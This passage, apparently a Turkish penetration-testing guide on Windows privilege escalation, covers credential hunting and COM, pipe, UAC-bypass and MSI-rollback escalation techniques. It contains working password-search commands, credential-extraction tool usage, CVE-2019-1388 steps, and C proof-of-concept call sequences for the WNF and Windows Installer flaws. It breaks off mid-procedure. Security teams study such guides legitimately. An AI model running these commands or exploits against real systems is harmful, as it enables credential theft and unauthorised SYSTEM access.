Erişilebilir, silinmiş bir `.pfx` dosyası **code-signing** için de ipucu olabilir. Erişilebilir bir özel anahtar içeriyorsa, bu anahtar değiştirilmiş bir PowerShell betiğini imzalayabilir; [PowerShell, özel anahtara sahip bir code-signing sertifikası gerektirir](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature) ve [AppLocker publisher kuralları imzalayanın kimliğini ve kural kapsamını değerlendirir](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Hesaplar arası yürütme için mevcut kimliğin tam olarak ilgili betiği değiştirebilmesi, etkin bir kuralın betik ve hedef hesap için ortaya çıkan imzayı kabul etmesi ve zamanlanmış bir görevin ya da daha yüksek ayrıcalıklı başka bir tüketicinin betiği gerçekten çalıştırması gerekir. `.pfx` dosya adı, sertifika konusu veya yazılabilir bir betik tek başına bu zincirin varlığını kanıtlamaz. Özel anahtar materyalini açmadan veya görevi tetiklemeden önce meta verileri, ACL'leri, ilkeyi ve zamanlanmış komutu inceleyin.

Kimlik bilgilerine dair ipuçları için erişilebilir mesajlaşma istemcisi profil veritabanlarını, notları ve alınan dosyaları da inceleyin. Bir BitLocker kurtarma dışa aktarımı HTML veya TXT olarak, bazen de adı belirtilmiş bir yedek arşivinin içinde saklanabilir. Bu tür materyaller, eski yedekleri içeren ayrı bir şifrelenmiş veri birimine erişim sağlayabilir; birimi ve arşivi yalnızca erişim yetkiniz varsa inceleyin. Bir yedek `NTDS.dit` içeriyorsa, çevrimdışı etki alanı kimlik bilgisi kurtarma için [yedekleme ve ayrıcalıklı gruplar iş akışında](../active-directory-methodology/privileged-groups-and-token-privileges.md) açıklandığı gibi eşleşen `SYSTEM` hive'ı da gerekir. Dosya adları ve kilitli bir birim, kullanılabilir bir kurtarma anahtarının veya etki alanı yedeğinin varlığını tek başına kanıtlamaz.

Çeşitli programlarda kaydedilmiş **parolaları kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Registry içinde

**Kimlik bilgileri içerebilecek diğer registry anahtarları**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Kayıt defterinden openssh anahtarlarını çıkarın.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome veya Firefox** parolalarının depolandığı veritabanlarını kontrol etmelisiniz.\
**Chrome, Edge veya Firefox** parolalarının depolandığı veritabanlarını kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer imlerini ve sık kullanılanlarını da kontrol edin; belki burada **parolalar** depolanmıştır.

Geçerli kullanıcının standart Edge **Default** profili için `Login Data`, `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` konumunda, `Local State` ise bunun üst dizini olan `User Data` dizinindedir. [Microsoft varsayılan profil konumunu belgeliyor](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); farklı bir profil veya `UserDataDir` ilkesi bu konumu değiştirebilir. Dosyaların mevcut olması yalnızca kimlik bilgisi deposuna dair bir ipucudur: dosyaların okunabilir olduğunu, ilgili kullanıcının DPAPI bağlamını veya diğer yetkili anahtar materyallerini ve kaydedilmiş bir oturum açma bilgisinin daha ayrıcalıklı bir hesaba ait olup olmadığını doğrulayın. Yalnızca yolları listelemek, veritabanını açmayı veya şifresi çözülmüş parolaları yazdırmayı gerektirmez.

Firefox için [Mozilla, bir profilin `key4.db` ve `logins.json` dosyalarının eşleşen anahtar ve şifrelenmiş oturum açma dosyaları olduğunu belgeliyor](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile). Bu dosyaların bulunması yalnızca bir ipucudur: her iki dosyanın da okunabilir olup olmadığını, kaydedilmiş girdilerin bulunup bulunmadığını ve kimlik bilgilerinin kullanılabilir olduğu sonucuna varmadan önce anahtarın Primary Password ile korunup korunmadığını kontrol edin. Kurtarılan bir kimlik bilgisi etki alanı hesabına aitse, bu hesabın etkin grup denetimi haklarını ve grubun [LAPS parola okuma veya şifre çözme haklarını](../active-directory-methodology/laps.md) ayrı ayrı inceleyin; tarayıcı artefaktları tek başına bir yönetici erişim yolu olduğunu göstermez.

Tarayıcılardan parola çıkarmaya yönelik araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, farklı dillerdeki yazılım bileşenlerinin **birbiriyle iletişim kurmasını** sağlayan, Windows işletim sisteminde yerleşik bir teknolojidir. Her COM bileşeni bir **sınıf kimliği (CLSID) ile tanımlanır** ve her bileşen, arayüz kimlikleri (IID'ler) ile tanımlanan bir veya daha fazla arayüz üzerinden işlevsellik sunar.

COM sınıfları ve arayüzleri, sırasıyla **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altındaki kayıt defterinde tanımlanır. Bu kayıt defteri, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** birleştirilerek oluşturulur.

Bu kayıt defterindeki CLSID'lerin içinde, **DLL** dosyasını işaret eden bir **varsayılan değer** ve **ThreadingModel** adlı bir değer içeren **InProcServer32** alt anahtarını bulabilirsiniz. **ThreadingModel** değeri **Apartment** (Tek İş Parçacıklı), **Free** (Çok İş Parçacıklı), **Both** (Tek veya Çok İş Parçacıklı) ya da **Neutral** (İş Parçacığından Bağımsız) olabilir.

![Tarayıcı Geçmişi - COM DLL Overwriting: Bu kayıt defterindeki CLSID'lerin içinde, DLL dosyasını işaret eden bir varsayılan değer ve bir değer... içeren InProcServer32 alt anahtarını bulabilirsiniz](<../../images/image (729).png>)

Temel olarak, çalıştırılacak **DLL dosyalarından herhangi birinin üzerine yazabilirseniz**, farklı bir kullanıcı bu DLL dosyasını çalıştırdığında **ayrıcalıkları yükseltebilirsiniz**.

Saldırganların COM Hijacking'i kalıcılık mekanizması olarak nasıl kullandığını öğrenmek için:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve kayıt defterinde genel parola arama**

**Dosya içeriğinde arama**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Belirli bir dosya adıyla dosya arama**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Kayıt defterinde anahtar adlarını ve parolaları arayın**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Parola arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** plugin'idir; kurbanın içinde kimlik bilgisi arayan her Metasploit POST modülünü **otomatik olarak çalıştırmak** için bu plugin'i oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada belirtilen parolaları içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parola çıkarmak için kullanılan bir başka harika araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) bu verileri açık metin olarak kaydeden çeşitli araçlara ait **oturumları**, **kullanıcı adlarını** ve **parolaları** arar (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

SYSTEM olarak çalışan bir **process'in** tam erişimle (`OpenProcess()`) **yeni bir process açtığını** düşünün. Aynı process, ana process'in tüm açık handle'larını devralan **düşük ayrıcalıklara sahip yeni bir process de oluşturur** (`CreateProcess()`).\
Ardından, **düşük ayrıcalıklı process'e tam erişiminiz varsa**, `OpenProcess()` ile oluşturulan ayrıcalıklı process'e ait **açık handle'ı alabilir** ve **shellcode enjekte edebilirsiniz**.\
[Bu açığı **nasıl tespit edip exploit edeceğiniz** hakkında daha fazla bilgi için bu örneği okuyun.](leaked-handle-exploitation.md)\
[Farklı izin düzeyleriyle (yalnızca tam erişim değil) devralınan process ve thread'lere ait daha fazla açık handle'ı nasıl test edip kötüye kullanacağınızı daha kapsamlı açıklayan bu **diğer yazıyı okuyun**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**Pipe** olarak adlandırılan paylaşımlı bellek segmentleri, process'ler arasında iletişim ve veri aktarımını sağlar.

Windows, ilgisiz process'lerin farklı ağlar üzerinden bile veri paylaşmasına olanak tanıyan **Named Pipes** adlı bir özellik sunar. Bu, rolleri **named pipe server** ve **named pipe client** olarak tanımlanan bir client/server mimarisine benzer.

Bir **client** pipe üzerinden veri gönderdiğinde, pipe'ı kuran **server**, gerekli **SeImpersonate** haklarına sahip olması koşuluyla, **client'ın kimliğine bürünebilir**. Taklit edebileceğiniz bir pipe üzerinden iletişim kuran **ayrıcalıklı bir process** tespit etmek, kurduğunuz pipe ile etkileşime girdiğinde bu process'in kimliğine bürünerek **daha yüksek ayrıcalıklar kazanma** fırsatı sunar. Böyle bir saldırıyı gerçekleştirme talimatları için [**buradaki**](named-pipe-client-impersonation.md) ve [**buradaki**](#from-high-integrity-to-system) faydalı kılavuzlara göz atabilirsiniz.

Ayrıca aşağıdaki araç, **burp gibi bir araçla named pipe iletişimini yakalamanızı sağlar:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu araç, privesc'leri bulmak için tüm pipe'ları listeleyip görüntülemenizi sağlar** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Sunucu modundaki Telephony service (TapiSrv), `\\pipe\\tapsrv` (MS-TRP) yolunu kullanıma açar. Kimliği doğrulanmış uzak bir client, mailslot tabanlı async event yolunu kötüye kullanarak `ClientAttach` işlemini, `NETWORK SERVICE` tarafından yazılabilir mevcut herhangi bir dosyaya yönelik keyfi bir **4-byte write** işlemine dönüştürebilir; ardından Telephony admin hakları kazanıp service olarak keyfi bir DLL yükleyebilir. İşlemin tamamı:

- `pszDomainUser` parametresi yazılabilir mevcut bir path olarak ayarlanmış `ClientAttach` → service, dosyayı `CreateFileW(..., OPEN_EXISTING)` ile açar ve async event yazımları için kullanır.
- Her event, `Initialize` içindeki saldırgan kontrollü `InitContext` değerini bu handle'a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app kaydedin, `TRequestMakeCall` (`Req_Func 121`) işlemini tetikleyin, `GetAsyncEvents` (`Req_Func 0`) ile alın, ardından deterministik yazımları tekrarlamak için kaydı silin/kapatın.
- `C:\Windows\TAPI\tsec.ini` içindeki `[TapiAdministrators]` grubuna kendinizi ekleyin, yeniden bağlanın ve `NETWORK SERVICE` olarak `TSPI_providerUIIdentify` çalıştırmak için keyfi bir DLL path'iyle `GetUIDllName` çağırın.

Daha fazla ayrıntı:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows'ta bir şeyler çalıştırabilecek dosya uzantıları

**[https://filesec.io/](https://filesec.io/)** sayfasına göz atın.

### Markdown renderer'ları üzerinden Protocol handler / ShellExecute kötüye kullanımı

`ShellExecuteExW`'ye iletilen tıklanabilir Markdown bağlantıları, tehlikeli URI handler'larını (`file:`, `ms-appinstaller:` veya kayıtlı herhangi bir scheme) tetikleyerek saldırgan kontrollü dosyaları mevcut kullanıcı olarak çalıştırabilir. Ayrıntılar:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Parolalar için Command Line'ları izleme**

Bir kullanıcı olarak shell aldığınızda, **command line üzerinde kimlik bilgilerini ileten** zamanlanmış görevler veya başka process'ler çalıştırılıyor olabilir. Aşağıdaki script, her iki saniyede bir process command line'larını yakalar ve mevcut durumu önceki durumla karşılaştırarak farklılıkları çıktılar.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## İşlemlerden parola çalma

## Düşük ayrıcalıklı kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Grafik arayüze (konsol veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, Microsoft Windows'un bazı sürümlerinde ayrıcalıksız bir kullanıcıdan terminali veya "NT\AUTHORITY SYSTEM" gibi başka bir işlemi çalıştırmak mümkündür.

Bu, aynı güvenlik açığıyla hem ayrıcalıkları yükseltmeyi hem de UAC'yi atlatmayı mümkün kılar. Ayrıca herhangi bir şey yüklemeye gerek yoktur ve işlem sırasında kullanılan binary, Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Bu güvenlik açığından yararlanmak için aşağıdaki adımları uygulamak gerekir:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Gerekli tüm dosya ve bilgilere aşağıdaki GitHub deposundan ulaşabilirsiniz:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium'dan High Integrity Level'a / UAC Bypass

**Integrity Levels** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

Ardından **UAC ve UAC bypasses** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Sunulan Kök Dizine Upload Directory Junctions

Bir uygulama, tahmin edilebilir bir upload alt dizini oluşturup çağıranın sağladığı bir dosya adını bu dizine yazabilir ve ardından dosyayı işleyebilir. Düşük ayrıcalıklı bir kullanıcı, sunucu tarafındaki yazma işleminden önce bu alt dizini silip yerine bir NTFS junction koyabiliyorsa, yazma işlemi junction'ı izleyerek web sunucusunun sunduğu bir dizine yönlenebilir. Sunucu bu dosya türünü çalıştırıyorsa, buraya yerleştirilen bir script web hizmeti kimliğiyle çalışabilir. Bu, uygulamaya özgü bir keyfi yazma sınırıdır; yazılabilir bir upload dizininin veya mevcut bir junction'ın tek başına varlığı bunu kanıtlamaz.

Upload handler'daki tam yol oluşturma mantığını ve zamanlamayı, kullanıcının alt dizindeki etkin silme/oluşturma izinlerini, hedef dizinin etkin ACL'lerini, yazma işlemini yapan bileşenin reparse point'leri izleyip izlemediğini ve web sunucusunun hedef dizindeki dosyaları çalıştırıp çalıştırmadığını kontrol edin. Yazma işlemini yapan bileşenin ve web sunucusunun process identity değerlerini ayrı ayrı doğrulayın. Pasif envanter, dizin ACL'lerini ve reparse metadata'sını gösterebilir ancak handler'ın davranışını veya gelecekteki bir junction değişimini doğrulayamaz. Çalıştırma bir service account kimliğiyle gerçekleşiyorsa, token privilege ile ilgili ayrı bir yolu değerlendirmeden önce **gerçek process token'ını** inceleyin.

## WNF tetiklemeli ayrıcalıklı scheduled task temizliği

Elle çalıştırılmayı reddeden bir scheduled task yine de ayrıcalıksız bir tetikleme yoluna sahip olabilir. Ayrıcalıklı bir task'ı denetlerken XML'ini dışa aktarın ve task DACL'sini, principal'ını ve action'ını olduğu gibi **tüm** trigger'larını da inceleyin. Özellikle `WnfStateChangeTrigger`, bir Windows Notification Facility (WNF) state'ini belirtir; bu securable state mevcut kullanıcının bir güncelleme yayınlamasına izin veriyorsa, kullanıcı `<AllowStartOnDemand>false</AllowStartOnDemand>` ayarına rağmen yapılandırılmış kimliğiyle task'ı dolaylı olarak başlatabilir.<sup>[[43]](#references)</sup>

Örneğin, Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` task'ı SYSTEM olarak çalışıyor, standart bir kullanıcının WNF state `7508BCA32C079E41` için güncelleme yayınlamasını kabul ediyor ve Recall devre dışı olsa bile `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` yolunu inceliyordu.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Erişilebilirliği test etmek için `ntdll.dll` içinden `ZwUpdateWnfStateData` işlevini çözümleyin, sekiz baytlık durum adı için boş bir güncelleme gönderin ve dönüş durumunu görevin son çalıştırma verileriyle veya Procmon etkinliğiyle karşılaştırın. Aşağıdaki basitleştirilmiş yoklama, Recall görevi örneğindeki bayt dizisini kullanır; test edilen görev için dışa aktarılan baytları kullanın.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Özyinelemeli temizliği ayrıcalıklı silme işlemine dönüştürme

Yararlı primitive tek başına tetikleyici değil, saldırganın denetimindeki bir dizini kabul eden ayrıcalıklı bir temizleme yordamıdır. İşlemi numaralandırmadan son değişikliğe kadar izleyin: profil/oturum keşfi, joker karakterlerle seçilen alt öğeler, `SHCreateItemFromParsingName` ve `IFileOperation::DeleteItem`, daha önce denetlenmiş bir yol adının daha sonra özyinelemeli olarak izleneceğine dair güçlü göstergelerdir. Alt öğeler güvenilir dizin tanıtıcılarına göre açılıp silinmeden önce doğrulanmıyorsa saldırgan, numaralandırma ile kullanım arasındaki çözümlemeyi değiştirebilir.<sup>[[43]](#references)</sup>

WNF tetikleyicisini aşağıda açıklanan [oplock, junction ve Object Manager symlink substitution](#from-folder-contents-delete-to-system-eop) ile eşleştirin: oplock, meşru alt öğeyi seçtikten sonra temizleyiciyi duraklatırken yazılabilir üst dizin değiştirilir; böylece devam eden ayrıcalıklı silme işlemi, `\RPC Control` üzerinden korunan hedefe yönelir. Recall zincirinde bu, belgelenmiş MSI rollback tekniği için gereken `C:\Config.Msi` dizininin SYSTEM tarafından silinmesini sağladı.<sup>[[31]](#references)[[43]](#references)</sup>

### İç içe alt öğeler, yüzeysel reparse point düzeltmelerini aşar

Yalnızca saldırganın denetimindeki kökü ve doğrudan alt öğesini doğrulamak, yol adına dayalı özyinelemeli silme işlemini güvenli hâle getirmez. Denetlenen bu nesneleri meşru bırakıp junction/oplock ikamesini onların altındaki ek bir alt öğeye taşıyın; `IFileOperation::DeleteItem` sonunda doğrulanmamış alt öğeye ulaşır ve yeni hedefini izler. CVE-2026-20941, ilk Recall yaması `UKP` ile GUID biçimindeki dizini doğrulamasına karşın eski özyinelemeli silme işlemini koruduğu için tam da bu tür eksik bir düzeltmeyle ortaya çıktı.<sup>[[43]](#references)</sup>

Güvenli yaklaşım, **her alt öğeyi** önceden güvenilen bir dizin tanıtıcısına göre açmak, son çözümlenen yolu/nesneyi alıp doğrulamak ve silme disposition'ını bu doğrulanmış tanıtıcıya uygulamaktır. Bir öneki doğrulayıp ardından yol adına dayalı özyinelemeli silme işlemine dönmeyin. Yama incelemesinde gerçek çağrı noktasındaki yapıları da inceleyin: bu durumda `NtCreateFile` çağrısındaki `OBJECT_ATTRIBUTES` yapısının çalışma zamanı incelemesi, sıfır olmayan bir `RootDirectory` ve göreli bir `{GUID}\\secure_file.lock` adı olduğunu göstererek ikinci bir `FILE_DELETE_ON_CLOSE` primitive'i bulunduğunu öne süren yanıltıcı decompiler çıktısını çürüttü.<sup>[[43]](#references)</sup>

## Herhangi Bir Klasörü Silme/Taşıma/Yeniden Adlandırma ile SYSTEM EoP

Bu teknik [**bu blog gönderisinde**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) açıklanmıştır; exploit kodu [**burada**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) mevcuttur.<sup>[[31]](#references)[[32]](#references)</sup>

Saldırı, temel olarak Windows Installer'ın rollback özelliğini kötüye kullanarak kaldırma işlemi sırasında meşru dosyaları kötü amaçlı dosyalarla değiştirmeyi içerir. Bunun için saldırganın, `C:\Config.Msi` klasörünü ele geçirmek üzere kullanılacak **kötü amaçlı bir MSI installer** oluşturması gerekir. Bu klasör daha sonra Windows Installer tarafından diğer MSI paketlerinin kaldırılması sırasında rollback dosyalarını depolamak için kullanılır; rollback dosyaları ise kötü amaçlı payload içerecek şekilde değiştirilmiş olur.

### Windows Installer COM temizleme yolu enjeksiyonu (CVE-2025-27727)

Düşük ayrıcalıklı bir istemci, `CMsiConfigurationManager` COM nesnesi (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) üzerinden SYSTEM `msiexec.exe` hizmetine erişebilir. Reverse engineering sonucunda ilgili `IMsiServer` çağrıları; vtable `0xA0` offset'indeki `MsiBeginTransactionW`, `0xC8` offset'indeki `SetEEUIDirectoryAndFilter` ve `0x50` offset'indeki `CleanupTempPackages` olarak belirlendi. Bu adlar ve offset'ler reverse-engineered bulgulardır ve derlemeler arasında değişebilir.<sup>[[41]](#references)</sup>

Yönetici olmayan bir kullanıcı için `SetEEUIDirectoryAndFilter`, yalnızca sağlanan yolu `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` ve `FILE_FLAG_OPEN_REPARSE_POINT` ile açarken çağıranı taklit eder. Bu, çağıranın dizini silebildiğini kanıtlar ve bir reparse point'in izlenmesini önler; ancak denetlenen dosya nesnesini sonraki temizleme işlemine bağlamaz veya dosyanın Windows Installer tarafından oluşturulduğunu kanıtlamaz.<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` çağrısından sonra `SetEEUIDirectoryAndFilter`, çağıranın filter argümanından bağımsız olarak yolu klasör olarak planlar. Hizmet, `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` altında adlandırılmış bir `REG_DWORD` değeri yazar: değer adı çağıranın denetimindeki yoldur, `0x00000002` verisi ise klasör bayrağıdır. Ardından `CleanupTempPackages(NULL, FALSE)` doğrudan temizleme işlemine girer. Yükseltilmiş worker, registry değerlerini numaralandırır ve klasör girdilerini yolun kaynağını denetlemeden özyinelemeli `FDeleteFolder` yordamına iletir. Normal kaldırma başarısız olursa kod ayrıca `LockdownPath` çağrısı yapar, dosya özniteliklerini temizler ve yeniden dener.<sup>[[41]](#references)</sup>

`msi.dll` dosyasından çıkarılan en kısa çağrı dizisi şöyledir:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Kullanışlı primitive, junction yönlendirmesi değil, path’in yeniden kullanılmasıdır. Saldırganın oluşturduğu `C:\Config.Msi` yolunu kaydedin, silin ve Windows Installer’ın daha sonra korumalı rollback verileriyle aynı yolu yeniden oluşturmasını sağlayın. Temizleme işlemi eski `TempPackages` adına güvenerek yeni dizini SYSTEM olarak siler. Reparse point gerekmediğinden bu yöntem, `FILE_FLAG_OPEN_REPARSE_POINT` ve redirection-trust mitigasyonlarının amaçlanan sınırını aşar.<sup>[[41]](#references)</sup>

Bu silme primitive’i aşağıdaki rollback zincirine uyar: ayrı `Installer\Folders` kaydını koruyun, korumalı `C:\Config.Msi` dizinini silin, NULL DACL ile yeniden oluşturun ve installer DACL’yi sıkılaştırmadan önce `WRITE_DAC` izni verilmiş bir handle tutun. Önceden açılmış handle, `NtSetSecurityObject` ile izin veren bir DACL’yi geri yükleyebilir; ardından rollback devam etmeden önce oluşturulan `.rbs` değiştirilebilir.<sup>[[41]](#references)</sup>

Microsoft, yeni feature gate etkin olduğunda `CMsiTransaction::SetEEUIDirectoryAndFilter` metodunun `ScheduleFileOrFolderDelete` çağırmasını engelleyerek bu yolu düzeltti. COM çağrısı yine de başarı döndürebilir, ancak artık saldırganın kontrolündeki yolu `TempPackages` içine eklemez. Yama testi olarak metodun başarıyla dönmesini kullanmak yerine Nisan 2025 Windows güvenlik güncellemelerini yükleyin.<sup>[[41]](#references)[[42]](#references)</sup>

Özetlenen teknik şöyledir:

1. **Aşama 1 – Hijack için Hazırlık (`C:\Config.Msi` boş bırakılır)**

- Adım 1: MSI’ı yükleyin
    - Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) yükleyen bir `.msi` oluşturun.
    - **Yönetici olmayan bir kullanıcının** çalıştırabilmesi için installer’ı **"UAC Compliant"** olarak işaretleyin.
    - Yüklemeden sonra dosyanın **handle**’ını açık tutun.

- Adım 2: Kaldırmayı başlatın
    - Aynı `.msi` dosyasını kaldırın.
    - Kaldırma işlemi dosyaları `C:\Config.Msi` dizinine taşımaya ve `.rbf` dosyaları (rollback yedekleri) olarak yeniden adlandırmaya başlar.
    - Dosya `C:\Config.Msi\<random>.rbf` olduğunda bunu tespit etmek için açık dosya handle’ını **`GetFinalPathNameByHandle` ile yoklayın**.

- Adım 3: Özel senkronizasyon
    - `.msi`, aşağıdakileri yapan bir **özel kaldırma eylemi (`SyncOnRbfWritten`)** içerir:
        - `.rbf` yazıldığında sinyal gönderir.
        - Ardından kaldırmaya devam etmeden önce başka bir event’i **bekler**.

- Adım 4: `.rbf` dosyasının silinmesini engelleyin
    - Sinyal geldiğinde, **`.rbf` dosyasını `FILE_SHARE_DELETE` olmadan açın** — bu, dosyanın **silinmesini engeller**.
    - Ardından kaldırma işleminin tamamlanabilmesi için sinyali geri gönderin.
    - Windows Installer `.rbf` dosyasını silemez ve tüm içeriği silemediğinden **`C:\Config.Msi` dizini kaldırılmaz**.

- Adım 5: `.rbf` dosyasını elle silin
    - Siz (saldırgan) `.rbf` dosyasını elle silin.
    - Artık **`C:\Config.Msi` boştur** ve ele geçirilmeye hazırdır.

> Bu noktada, `C:\Config.Msi` dizinini silmek için **SYSTEM düzeyinde keyfi klasör silme zafiyetini tetikleyin**.

2. **Aşama 2 – Rollback Script’lerini Kötücül Olanlarla Değiştirme**

- Adım 6: `C:\Config.Msi` dizinini zayıf ACL’lerle yeniden oluşturun
    - `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
    - **Zayıf DACL’ler** ayarlayın (ör. Everyone:F) ve `WRITE_DAC` iznine sahip bir handle’ı **açık tutun**.

- Adım 7: Başka bir yükleme çalıştırın
    - `.msi` dosyasını yeniden yükleyin ve şunları kullanın:
        - `TARGETDIR`: Yazılabilir konum.
        - `ERROROUT`: Zorunlu bir hatayı tetikleyen değişken.
    - Bu yükleme, `.rbs` ve `.rbf` dosyalarını okuyan **rollback** işlemini yeniden tetiklemek için kullanılacaktır.

- Adım 8: `.rbs` dosyasını izleyin
    - Yeni bir `.rbs` görünene kadar `C:\Config.Msi` dizinini izlemek için `ReadDirectoryChangesW` kullanın.
    - Dosya adını kaydedin.

- Adım 9: Rollback öncesinde senkronize edin
    - `.msi`, aşağıdakileri yapan bir **özel yükleme eylemi (`SyncBeforeRollback`)** içerir:
        - `.rbs` oluşturulduğunda bir event’e sinyal gönderir.
        - Ardından devam etmeden önce bekler.

- Adım 10: Zayıf ACL’leri yeniden uygulayın
    - `.rbs created` event’ini aldıktan sonra:
        - Windows Installer, `C:\Config.Msi` dizinine **güçlü ACL’leri yeniden uygular**.
        - Ancak `WRITE_DAC` iznine sahip bir handle hâlâ sizde olduğundan **zayıf ACL’leri yeniden uygulayabilirsiniz**.

> ACL’ler **yalnızca handle açılırken uygulanır**, bu nedenle klasöre yazmaya devam edebilirsiniz.

- Adım 11: Sahte `.rbs` ve `.rbf` dosyalarını bırakın
